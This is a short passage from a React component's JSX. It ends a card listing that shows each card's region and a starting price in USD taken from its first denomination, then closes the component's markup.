                      <span className="truncate max-w-[160px]">{card.region}</span>
                    </div>
                    <span className="font-bold text-emerald-600">
                      From ${card.denominations[0].priceUsd} USD
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
